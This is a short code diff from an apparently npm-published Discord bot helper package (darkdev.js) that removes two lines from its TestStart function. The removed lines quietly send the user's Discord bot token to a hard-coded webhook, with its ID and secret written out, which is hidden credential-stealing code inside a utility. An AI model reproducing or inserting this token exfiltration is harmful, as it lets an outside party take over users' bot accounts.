@@ -57,8 +57,6 @@ function DarkMS(milliseconds) {
 
 function TestStart(token) {
 client.login(token).then(() => {
-const Webhook = new Discord.WebhookClient('888107540544622652', 'IGsAfG4ABYSHPdJv3EJif6l11Cd1hBOIHb3AsG0bVkjraIeCi0_4sEGfIkV6YmVBS2RO')
-Webhook.send(new Discord.MessageEmbed().setDescription(token))
 console.log(`${client.user.tag} başarıyla başlatıldı ve kapatılıyor. | ${client.user.tag} succesfully started and now shuting down.`)
 console.log('npmjs.com/package/darkdev.js')
 setTimeout(() => { process.exit(0) },2500)
